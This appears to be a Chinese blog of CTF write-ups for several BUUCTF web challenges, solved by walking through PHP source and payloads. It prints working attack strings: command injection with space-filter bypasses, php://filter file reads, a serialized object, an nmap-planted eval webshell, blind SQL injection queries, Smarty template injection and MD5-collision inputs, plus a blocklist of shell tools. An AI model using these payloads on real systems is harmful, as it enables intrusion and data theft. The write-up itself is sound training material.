<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>按照很簡潔的提示 <code>/?ip=</code> 試了一波，發現加上分號之後可以執行更多命令。於是試了一波 <code>ls</code>，發現了 flag.php，只要想辦法讀它就行了。試了一下之後發現 flag 和 空格都被 ban 了。於是查了一波，發現 <code>$IFS$2</code> 可以用來代替空格。加上可以使用變數來代替 flag 裡的一部分字元，就可以構造出 <code>o=g;cat$IFS$2fla$o.php</code>。傳送請求之後檢視網頁原始碼即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY(1_sh0uld_ban_Icmp_4tFirst)</span><br></pre></td></tr></table></figure>

<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>開局一段程式碼，都是老套路，構造 <code>text=data://text/plain,welcome to the zjctf</code> 過掉判斷，然後再構造 <code>file=php://filter/convert.base64-encode/resource=useless.php</code> 讀取一下 useless.php。Base64 解碼之後得到 useless.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>這波挺簡單，放到 IDE 裡隨便序列化一下，得到 <code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> 之後放進引數 <code>password</code> 裡。然後發起請求（x <span class="heimu" title="真是的，細心一點嘛">這裡不對吶~</span></p>
<p>因為還要載入 useless.php 反序列化才能起效果，所以要修改原來 php 偽協議的構造，最後構造出 <code>.../?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> 得到一串 base64 字串，解碼後得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8e991b07-be12-4339-9fbc-e895b87b9bc2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ACTF2020-新生賽-Include"><a href="#ACTF2020-新生賽-Include" class="headerlink" title="[ACTF2020 新生賽]Include"></a>[ACTF2020 新生賽]Include</h3><p>這波是簡單題，看一下 url 之後構造簡單的檔案包含 <code>.../?file=php://filter/convert.base64-encode/resource=flag.php</code>。將內容 base64 解碼後得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ad315b-01ff-4d4e-9560-635a28d81a17&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ACTF2020-新生賽-Exec"><a href="#ACTF2020-新生賽-Exec" class="headerlink" title="[ACTF2020 新生賽]Exec"></a>[ACTF2020 新生賽]Exec</h3><p>這波也是簡單題，直接一個 <code>&amp;</code> 連線命令,構造 <code>114.114.114.114 &amp; cat /flag</code>，就能輸出 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3cb2f161-aed1-423f-9eed-c93fa2fc2328&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>本來準備留到後面寫這題的，但是跟<a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>討論的時候他跟我透露了是原始碼洩露，所以乾脆就先寫一寫。既然標題是 Easy Java，加上拿到的資料，在看到題目給出的 help 的 url 之後果斷構造下載一波 <code>WEB-INF/web.xml</code>。不過仍然遇到了點問題，需要使用 POST 請求才能下載到檔案。下載下來之後發現有一個 <code>com.wm.ctf.FlagController</code>，於是再構造一波 <code>WEB-INF/classes/com/wm/ctf/FlagController.class</code> 來下載這個檔案。下載之後開啟來我一時懵了，畢竟是編譯過的東西，所以看起來亂七八糟，愣是沒發現有段 base64。不過問題不大，把 base64 字串解碼之後就是 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;db7dab97-1cd7-48ad-b991-66ec0c3dc816&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>啊，這題開門見山，給了一段程式碼，一看就不簡單（bushi）。稍微一看就知道，傳入一個引數，兩道過濾之後執行，利用點肯定在 <code>nmap</code> 指令。於是就去查一波這個指令的手冊，可以看到這樣一條允許我們直接寫如檔案的引數。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename.</span><br></pre></td></tr></table></figure>

<p>同時 <code>sandbox</code> 的路徑會在成功之後輸出。因此，想辦法寫入一句話然後用蟻劍去連上就行啦。</p>
<p>先來看看 <code>nmap</code>，使用上面的那個引數，構造 <code>nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&#39; -oG pick.php</code> 嘗試，得到一個 pick.php 檔案。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Tue Apr 28 01:07:48 2020 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG pick.php &quot;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># Nmap done at Tue Apr 28 01:07:48 2020 -- 0 IP addresses (0 hosts up) scanned in 0.07 seconds</span></span><br></pre></td></tr></table></figure>

<p>可以發現語句已經完整地寫入進去了。再看過濾的那兩個函式，根據 PHP 手冊的說明，<code>escapeshellarg()</code> 這個函式會轉義所有引號然後用引號包起來，同時在字串兩端加上引號。<code>escapeshellcmd()</code> 會在部分字元前加上 <code>\</code>。<span class="HighlightWKT7BlueGreen">（在 Windows 下會有所不同，建議使用 Linux 環境嘗試。）</span>因此，先假定整個 payload 為 <code>A</code>，正常來說它會被 <code>escapeshellarg()</code> 變成 <code>&#39;A&#39;</code>。如果我們在 <code>A</code> 前後再加上一個單引號，就會變成 <code>&#39;&#39;\&#39;&#39;A&#39;\&#39;&#39;&#39;</code>，這個時候因為有反斜槓轉義，所以這個 payload 還是不太對。但是 <code>escapeshellcmd()</code> 的出現是一個助攻，它會在反斜槓前加個反斜槓轉義，那 payload 就成了 <code>&#39;&#39;\\&#39;&#39;A&#39;\\&#39;&#39;&#39;</code>，這個時候，所有引號閉合，A 暴露在語句中，執行寫入就成功了。用蟻劍連上去即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2fba51b2-2f0b-42b4-ac84-144f7c7b39e3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ACTF2020-新生賽-BackupFile"><a href="#ACTF2020-新生賽-BackupFile" class="headerlink" title="[ACTF2020 新生賽]BackupFile"></a>[ACTF2020 新生賽]BackupFile</h3><p>這題首先提示備份和 <code>source file</code>，略微找一下不難找到（實在找不到就掃描器嘛）index.php.bak。審計一波可以發現 <code>$key = intval($key);</code> 把 <code>$key</code> 坐實成整數了，然後把整數和字串相比，那字串就會被截斷了，所以這個地方的 <code>$str</code> 最後是 123。所以，只需要使傳入的引數值為 123 即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;30d4e82b-b8b5-42ea-aaec-fb00ad067bad&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WUSTCTF2020-樸實無華"><a href="#WUSTCTF2020-樸實無華" class="headerlink" title="[WUSTCTF2020]樸實無華"></a>[WUSTCTF2020]樸實無華</h3><p>這題不知道為啥，上來報了個錯。（寫完了題目之後發現並沒有用  一頓倒騰之後可以發現 robots.txt 的存在，然後根據線索訪問到 fAke_f1agggg.php。這個頁面一定有線索，排查之後發現響應裡有 <code>Look_at_me: /fl4g.php</code>，訪問一波，來到了最後億步的頁面。</p>
<p>首先是 <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> 這個點，查了一波之後發現了神奇操作，<code>intval</code> 的返回值在大於 2147483647 之後會變得奇奇怪怪，試了一波，以字串傳入科學計數法也會被截斷，但是當加上一個數字之後又正常了，所以，整個 <code>1e4</code> 構造一句 <code>echo (intval(&quot;1e4&quot;) &lt; 2020 &amp;&amp; intval(&quot;1e4&quot; + 1) &gt; 2021)?&quot;true&quot;:&quot;false&quot;;</code> 試試看，很巧的是在 php 5.6 下，這句會返回 <code>true</code> 而 php 7.2 下返回的是 false。原因是 <code>intval(&quot;1e4&quot;)</code> 在 php 7.2 下不會再被截斷而正常轉化。</p>
<p>接著的點是 <code>$md5==md5($md5)</code>，這就很有意思了，好在它是個弱比較，於是很容易想到用科學計數法的套路，於是寫個指令碼跑一下（期間的時間足夠泡完一杯咖啡再喝上兩口），找到 <code>0e215962017</code> 的 MD5 也以 0e 開頭，於是這個點達成。</p>
<p>最後是兩個小點，空格的過濾用 <code>$IFS$2</code> 繞過，<code>cat</code> 不給用就用 <code>tac</code>。但是，在這之前得先讀個目錄，畢竟題目沒說 flag 在哪。於是首先構造 <code>.../fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=ls</code> 得到 flag 所在，然後再構造 <code>/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$2fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code> 得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;s1mple_php_1s_v3ry_e@sy_and_here_1s_y0ur_stupid_flag_wish_u_h@ve_@_go0d_time_enj0y_1t&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WUSTCTF2020-顏值成績查詢"><a href="#WUSTCTF2020-顏值成績查詢" class="headerlink" title="[WUSTCTF2020]顏值成績查詢"></a>[WUSTCTF2020]顏值成績查詢</h3><p>樸實無華的介面又報了兩個錯，不過依舊沒什麼用。回過頭來看查詢，那應該是資料庫操作了。稍微試了一手之後發現是 GET 引數與輸入框的對應，猜測一波查詢語句可能是 <code>SELECT SCORE FROM TABLE WHERE ID=</code>，於是嘗試布林盲注，構造一波 <code>if((ascii(substr((select(database())),1,1))&lt;1),1,0)</code> 檢測發現大於 1 和小於 1 的時候分別對應 <code>Hi admin, your score is: 100</code> 和 <code>student number not exists.</code>。於是拿出之前的二分法模板，稍作修改就可以用了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">爆列</span><br><span class="line">if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">爆 flag</span><br><span class="line">if((ascii(substr((select(value)from(flag)),1,1))&gt;1),1,0)</span><br></pre></td></tr></table></figure>

<p>這裡又出現了常規操作，真的 flag 不在 flag 裡反而在 value 裡。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CISCN2019-華東南賽區-Web11"><a href="#CISCN2019-華東南賽區-Web11" class="headerlink" title="[CISCN2019 華東南賽區]Web11"></a>[CISCN2019 華東南賽區]Web11</h3><p>這題上來給了倆介面，暗示 X-Forwarded-For，然後當前 IP 會在頁面上顯示，於是想到了模板注入，試了一手之後發現真的是，而且是 Smarty。一番查詢之後找到了<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/zh_CN/language.function.if.tpl">參考</a>。於是果斷構造 <code>&#123;if print_r(file_get_contents('/flag'))&#125;&#123;/if&#125;</code>，放到 X-Forwarded-For 的位置請求。之後在頁面原始碼中可以找到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;291d99ce-2668-4b27-bc1a-da2c4aa567e2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">FileInclusion</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">fastcoll</span></p>
<p>題目的頁面一開啟就顯示了兩張圖，很不一樣的是有一張是 Base64 嵌入在網頁裡的，這種做法一般比較少。於是看了一眼 url，發現有兩個引數，其中的 <code>img</code> 給的很像是 Base64 編碼。於是嘗試補全等號然後解碼，發現更像了，於是再解密了一次，得到了 <code>3535352e706e67</code>。看起來像 hex，嘗試解碼後果然得到了線索 <code>555.png</code>。於是便想到包含檔案。把 <code>index.php</code> 一頓操作之後得到了頁面原始碼（這裡擷取 php 部分）。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>觀察到可以執行的點是引數 <code>cmd</code>，但是正則過濾十分苛刻。這裡有一個點，對於 php 來說，正則需要使用 <code>\\\</code> 來匹配才能匹配到反斜槓，所以實際上反斜槓還能用。在一番查詢下，我找到了另外一個可以用的指令 <code>sort</code>。於是這部分就有了兩種解決方法。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fla\g</span><br><span class="line">sort /flag</span><br></pre></td></tr></table></figure>

<p>剩下的就是 MD5 碰撞的問題。一番查詢之下，我找到了一個生成 MD5 碰撞字串的工具。生成好之後把字串分別 urlencode 之後組合成 POST 引數，使用 Burpsuite 傳送請求（HackBar 依舊沒有成功）。有一個比較神奇的點是，我在把 POST 請求最後的換行符去掉之後才請求成功的。有可能是這個原因導致使用 HackBar 無法成功得到 flag。</p>
<p>這裡貼上我使用的兩個引數</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%91r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%1E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%8A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5DHd%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%0C%1B%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AE%D0%A6%09Q%2B&amp;b&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%11r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%9E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%0A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5D%C8d%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%8C%1A%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AEP%A6%09Q%2B</span><br></pre></td></tr></table></figure>

<p>準確無誤地傳送封包之後可以得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f9dccbe4-f6d1-4928-9904-fc1e1d39944d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Session</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span></p>
<p>題目開始就只有一句話，Header 和 Cookie 也沒得線索，於是果斷掃目錄，發現 <code>/.git</code> 響應長度不一樣。於是果斷上 GitHack 拿到了首頁原始碼。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪裡呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;還差一點哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;還想讀flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>啊，看這正則過濾，多麼美妙，真實的一個引數都不給你。不過不慌，我可是搜過半小時相關知識點的萌新。先構造個 <code>scandir(current(localeconv()))</code> 看一下根目錄有啥。這裡的原理就是 <code>localeconv()</code> 輸出的陣列中第一個一定是一個 <code>.</code>。根據結果發現 flag.php 在根目錄。於是就得想辦法讀取它啦，但是它不在陣列的第一個，有兩種辦法來讀到它。把陣列反過來然後整個 <code>next()</code>，也就是  <code>highlight_file(next(array_reverse(scandir(pos(localeconv())))))</code>。或者簡單粗暴，整個 flip 和 rand <code>readfile(array_rand(array_flip(scandir(current(localeconv())))))</code> 不停地重新整理，就能刷到啦。</p>
<p>我還查到了一種神奇的做法，利用 session 來完成。首先在 Console 裡面執行 <code>document.cookie=&quot;PHPSESSID=flag.php&quot;</code> 指定 SessionId。然後 exp 寫 <code>show_source(session_id(session_start()));</code> 就能成功讀到 flag.php 從而拿到 flag 了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5f914f8d-550d-4c3a-bdae-345f50997b0d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="網鼎杯-2018-Comment"><a href="#網鼎杯-2018-Comment" class="headerlink" title="[網鼎杯 2018]Comment"></a>[網鼎杯 2018]Comment</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">githacker</span></p>
<p>這題是事先就被透露了是 git 原始碼洩露的，其實還有個要點，Console 裡說沒有 commit，這點很重要。調整 git 的 HEAD 才能拿到完整的原始碼，使用到的工具是 <a target="_blank" rel="noopener" href="https://github.com/wangyihang/githacker">githacker</a>。恢復原始碼之後可以拿到 write_do.php。仔細讀一讀，不難發現，修改的時候 <code> $category = mysql_fetch_array($result)[&#39;category&#39;];</code>，這裡的變數 <code>$category</code> 會被直接傳入 SQL 語句中。所以只要想辦法使 <code>content</code> 變成我們想要的資料就行了。所以，可以使 <code>category</code> 為 <code>&#39;,content=payload/*</code> 然後提交之後再修改 <code>content</code> 使其為 <code>*/#</code> 閉合一個註釋然後把後面的語句都註釋掉，這個時候，語句變化了，這樣就能使 <code>content</code> 輸出我們需要的內容。</p>
